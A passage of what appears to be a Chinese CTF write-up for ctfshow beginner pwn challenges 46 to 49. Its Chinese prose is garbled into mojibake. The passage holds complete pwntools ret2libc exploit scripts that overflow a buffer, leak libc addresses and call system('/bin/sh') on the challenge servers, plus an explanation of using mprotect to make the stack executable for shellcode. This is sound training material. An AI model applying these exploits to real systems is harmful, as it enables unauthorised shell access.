</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x70</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi_r15_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">write_got</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">write_plt</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">main</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;O.o?&#34;</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">write</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x7f</span><span class="s1">&#39;</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">LibcSearcher</span><span class="p">(</span><span class="s1">&#39;write&#39;</span><span class="p">,</span><span class="n">write</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">write</span><span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;write&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">binsh</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;str_bin_sh&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x70</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">binsh</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;O.o?&#34;</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="pwn_047">PWN_047
</h3><p>é¢˜ç›®ï¼šez ret2libc</p>
<p>å°±æç¤ºç”¨ret2libc</p>
<p>checksecä¸€ä¸‹ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/146.png"
	width="770"
	height="234"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/146_hu_fc06a635d328f011.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/146_hu_919669922d8ebe2f.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="329"
		data-flex-basis="789px"
	
></p>
<p>IDA32ä½åˆ†æï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/147.png"
	width="864"
	height="290"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/147_hu_ecb2389afc78956f.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/147_hu_c87d29f473550c93.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="297"
		data-flex-basis="715px"
	
></p>
<p>è¿è¡Œç¨‹åºï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/148.png"
	width="1075"
	height="585"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/148_hu_68a9c42744f4d3b5.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/148_hu_2f76dbfda3e7bb57.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="183"
		data-flex-basis="441px"
	
></p>
<p>ä¸€ä¸Šæ¥å°±ç»™äº†å‡ ä¸ªå‡½æ•°çš„åœ°å€ï¼Œç›®å‰æ¥çœ‹è¿˜æ²¡ç»™å‡ºsystemçš„åœ°å€ã€‚</p>
<p>è·Ÿè¿›ctfshowå‡½æ•°è¿˜å‘ç°äº†<code>gets</code>å‡½æ•°ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/149.png"
	width="720"
	height="200"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/149_hu_f03cd6d93e5d9470.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/149_hu_dce5425d9dfb9004.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="360"
		data-flex-basis="864px"
	
></p>
<p>é‚£å°±æ˜¯é€šè¿‡æ ˆæº¢å‡ºret2libcæ¥æflagå’¯ã€‚</p>
<p>åœ¨dataå­—æ®µè¿˜æ‰¾åˆ°äº†/bin/shï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/150.png"
	width="870"
	height="288"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/150_hu_80b41588e2888370.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/150_hu_14f781a1e68c7689.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="302"
		data-flex-basis="725px"
	
></p>
<p>ä½ æœ‰æ— å‘ç°ï¼šè¿™ä¸ª/bin/shçš„åœ°å€å°±æ˜¯gift</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/151.png"
	width="1204"
	height="570"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/151_hu_fc6f5087e790c1de.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/151_hu_f0d75ad6073237cd.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="211"
		data-flex-basis="506px"
	
></p>
<p>é‚£æ€è·¯å°±æ˜¯ç”¨putsè¿›è¡Œæ³„éœ²åœ°å€ï¼Œå¾—å‡ºåç§»é‡å†åæ¨å‡ºsystemå‡½æ•°çš„çœŸå®åœ°å€</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28146</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">puts_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">puts_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;puts:&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">puts</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span><span class="n">drop</span> <span class="o">=</span> <span class="kc">True</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;gift:&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">bin_sh</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span><span class="n">drop</span> <span class="o">=</span> <span class="kc">True</span><span class="p">))</span>  <span class="c1">#åªè¯»å–åœ°å€ï¼Œä¸¢å¼ƒæ¢è¡Œ\nçš„16è¿›åˆ¶å­—ç¬¦ä¸²</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">LibcSearcher</span><span class="p">(</span><span class="s1">&#39;puts&#39;</span><span class="p">,</span><span class="n">puts</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">puts</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;puts&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x9c</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">system</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="pwn_048">PWN_048
</h3><p>é¢˜ç›®ï¼šæ²¡æœ‰writeäº†ï¼Œè¯•è¯•ç”¨putså§ï¼Œæ›´ç®€å•äº†å‘¢ã€‚</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/152.png"
	width="795"
	height="234"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/152_hu_82ddc294ee9dbdfb.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/152_hu_da96e2278b37543.png 1024w"
	loading="lazy"
	
		alt="checksec"
	
	
		class="gallery-image" 
		data-flex-grow="339"
		data-flex-basis="815px"
	
></p>
<p>IDA32åˆ†æï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/153.png"
	width="936"
	height="199"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/153_hu_db48b024a3718cbf.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/153_hu_7601ca075a457054.png 1024w"
	loading="lazy"
	
		alt="mainå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="470"
		data-flex-basis="1128px"
	
></p>
<p>è·Ÿè¿›ctfshowå‡½æ•°ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/154.png"
	width="746"
	height="140"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/154_hu_6bb66ac2c50192d8.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/154_hu_277011d3545cec3e.png 1024w"
	loading="lazy"
	
		alt="æœ‰æ ˆæº¢å‡º"
	
	
		class="gallery-image" 
		data-flex-grow="532"
		data-flex-basis="1278px"
	
></p>
<p>ç¼–å†™expæ³„éœ²putsçš„åœ°å€ï¼Œå¾—å‡ºåç§»é‡åŒºåæ¨å‡ºsystemå‡½æ•°ã€/bin/shçš„åœ°å€ã€‚</p>
<p>expï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28189</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">main</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;main&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">puts_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">puts_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x6b</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">main</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;O.o?&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">puts</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\xf7</span><span class="s1">&#39;</span><span class="p">)[</span><span class="o">-</span><span class="mi">4</span><span class="p">:])</span>
</span></span><span class="line"><span class="cl"><span class="c1">#\xf7 æ˜¯ç¨‹åºè¾“å‡ºä¸­ writeã€puts åœ°å€çš„æ ‡å¿—æ€§æœ«å°¾å­—èŠ‚ã€‚é€šè¿‡ recvuntil(&#39;\xf7&#39;)ï¼Œå¯ä»¥ç¡®ä¿ï¼šè¯»å–åˆ°çš„å†…å®¹ â€œåŒ…å« puts åœ°å€çš„å®Œæ•´æœ‰æ•ˆéƒ¨åˆ†â€ï¼ˆå› ä¸ºåªæœ‰é‡åˆ° \xf7 æ‰ä¼šåœæ­¢è¯»å–ï¼‰ã€‚é¿å…å› ç¨‹åºè¾“å‡ºå­˜åœ¨å…¶ä»–å¹²æ‰°æ•°æ®ï¼Œå¯¼è‡´ recv(4) æå‰æˆªå–åˆ°é”™è¯¯çš„ 4 å­—èŠ‚ã€‚</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">puts</span><span class="p">))</span>   <span class="c1">#å¯è¦å¯ä¸è¦ï¼Œåªæ˜¯æ–¹ä¾¿æ£€æŸ¥</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">LibcSearcher</span><span class="p">(</span><span class="s1">&#39;puts&#39;</span><span class="p">,</span><span class="n">puts</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">puts</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;puts&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">bin_sh</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;str_bin_sh&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x6b</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">system</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">main</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="pwn_049">PWN_049
</h3><p>é¢˜ç›®ï¼šé™æ€ç¼–è¯‘ï¼Ÿæˆ–è®¸ä½ å¯ä»¥æ‰¾æ‰¾mprotectå‡½æ•°ã€‚</p>
<p>checksecä¸€ä¸‹ï¼Œæ²¡å¼€canaryã€PIEã€NXä¿æŠ¤ã€‚</p>
<p>IDA32ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/155.png"
	width="1281"
	height="516"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/155_hu_b973c2d823f63ff9.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/155_hu_b3772a185c0448ca.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="248"
		data-flex-basis="595px"
	
></p>
<p>å¯ä»¥çœ‹åˆ°æœ‰éå¸¸å¤šçš„å‡½æ•°ï¼Œè¿™å°±æ˜¯é™æ€ç¼–è¯‘ã€‚</p>
<p>è·Ÿè¿›ctfshowå‡½æ•°ï¼Œçœ‹åˆ°readæœ‰æ ˆæº¢å‡ºæ¼æ´ã€‚</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/157.png"
	width="654"
	height="149"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/157_hu_9ddface01add7ae3.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/157_hu_e826473b4239865f.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="438"
		data-flex-basis="1053px"
	
></p>
<p>æ‰¾mprotectå‡½æ•°ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/156.png"
	width="820"
	height="205"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/156_hu_4c4ae03dbf0da030.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/156_hu_5d71e420e11b0740.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="400"
		data-flex-basis="960px"
	
></p>
<h4 id="mprotectå‡½æ•°"><strong>Mprotectå‡½æ•°</strong>
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">mprotect</span><span class="p">(</span><span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="n">a1</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">a2</span><span class="p">,</span> <span class="kt">int</span> <span class="n">a3</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// eax
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="n">result</span> <span class="o">=</span> <span class="nf">sys_mprotect</span><span class="p">(</span><span class="n">a1</span><span class="p">,</span> <span class="n">a2</span><span class="p">,</span> <span class="n">a3</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">result</span> <span class="o">&gt;=</span> <span class="mh">0xFFFFF001</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nf">_syscall_error</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<h5 id="ä»£ç è§£æ">ä»£ç è§£æï¼š
</h5><ol>
<li><strong>å‡½æ•°å‚æ•°</strong>ï¼š</li>
</ol>
<ul>
<li><code>a1</code>ï¼šè¦ä¿®æ”¹æƒé™çš„å†…å­˜èµ·å§‹åœ°å€ï¼ˆéœ€é¡µå¯¹é½ï¼‰ã€‚</li>
<li><code>a2</code>ï¼šå†…å­˜åŒºåŸŸçš„é•¿åº¦ï¼ˆå­—èŠ‚æ•°ï¼‰ã€‚</li>
<li><code>a3</code>ï¼šæ–°çš„ä¿æŠ¤æƒé™ï¼ˆå¦‚ <code>PROT_READ</code>ã€<code>PROT_WRITE</code>ã€<code>PROT_EXEC</code> ã€<code>PROT_NONE</code>ã€<code>prot=7</code>ï¼‰ã€‚protå¯ä»¥å–è¿™å‡ ä¸ªå€¼ï¼Œå¹¶ä¸”å¯ä»¥ç”¨â€œ|â€å°†å‡ ä¸ªå±æ€§åˆèµ·æ¥ä½¿ç”¨ã€‚</li>
</ul>
<ol start="2">
<li><strong>æ ¸å¿ƒé€»è¾‘</strong>ï¼š</li>
</ol>
<ul>
<li>è°ƒç”¨ <code>sys_mprotect</code>ï¼šè¿™æ˜¯çœŸæ­£çš„å†…æ ¸çº§ç³»ç»Ÿè°ƒç”¨ï¼ˆç”¨æˆ·æ€åˆ°å†…æ ¸æ€çš„æ¡¥æ¢ï¼‰ï¼Œè´Ÿè´£å®é™…æ‰§è¡Œå†…å­˜æƒé™ä¿®æ”¹æ“ä½œã€‚</li>
<li>é”™è¯¯å¤„ç†ï¼š<code>sys_mprotect</code> çš„è¿”å›å€¼è‹¥ <code>&gt;= 0xFFFFF001</code>ï¼ˆè¿™æ˜¯ Unix/Linux ä¸­ç³»ç»Ÿè°ƒç”¨é”™è¯¯ç çš„å…¸å‹èŒƒå›´ï¼Œé€šå¸¸è¡¨ç¤ºæ“ä½œå¤±è´¥ï¼‰ï¼Œåˆ™é€šè¿‡ <code>_syscall_error()</code> å¤„ç†é”™è¯¯ï¼ˆä¾‹å¦‚è®¾ç½® <code>errno</code> å¹¶è¿”å›é”™è¯¯ç ï¼‰ã€‚</li>
<li>æˆåŠŸè¿”å›ï¼šè‹¥ç³»ç»Ÿè°ƒç”¨æˆåŠŸï¼Œç›´æ¥è¿”å› <code>sys_mprotect</code> çš„ç»“æœï¼ˆé€šå¸¸ä¸º 0ï¼‰ã€‚</li>
</ul>
</blockquote>
<p>è¿™æ®µä»£ç æ˜¯ç”¨æˆ·æ€ <code>mprotect</code> å‡½æ•°çš„å°è£…ï¼Œæœ¬è´¨æ˜¯é€šè¿‡è°ƒç”¨å†…æ ¸çš„ <code>sys_mprotect</code> ç³»ç»Ÿè°ƒç”¨æ¥å®ç°åŠŸèƒ½ï¼Œæœ€ç»ˆç›®çš„æ˜¯ï¼š</p>
<p><strong>å…è®¸è¿›ç¨‹åŠ¨æ€ä¿®æ”¹æŸæ®µå†…å­˜çš„è¯»å†™æ‰§è¡Œæƒé™</strong>ï¼ˆä¾‹å¦‚å°†åªè¯»å†…å­˜æ”¹ä¸ºå¯å†™ï¼Œæˆ–ç»™æ•°æ®æ®µæ·»åŠ æ‰§è¡Œæƒé™ï¼‰ï¼Œå¸¸ç”¨äºå†…å­˜ç®¡ç†ã€åŠ¨æ€ä»£ç åŠ è½½ã€æ¼æ´åˆ©ç”¨ç­‰åœºæ™¯ã€‚</p>
<p>ç®€å•è¯´ï¼Œè¿™æ®µä»£ç æ˜¯ç”¨æˆ·ç¨‹åºä¸å†…æ ¸äº¤äº’çš„ â€œä¸­é—´å±‚â€ï¼Œè®©å¼€å‘è€…å¯ä»¥é€šè¿‡ç®€å•çš„å‡½æ•°è°ƒç”¨ä¿®æ”¹å†…å­˜æƒé™ï¼Œè€Œæ— éœ€ç›´æ¥æ“ä½œå†…æ ¸æ¥å£ã€‚</p>
<p>é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥åˆ©ç”¨å®ƒä¿®æ”¹å†…å­˜çš„æƒé™ä¸ºå¯è¯»å¯å†™å¯æ‰§ è¡Œï¼ˆRWXï¼‰ï¼Œç„¶åæˆ‘ä»¬å°±å¯ä»¥å¾€æ ˆä¸Šå†™å…¥shellcodeã€æ‰§è¡Œï¼Œæœ€åè·å–shellã€‚</p>
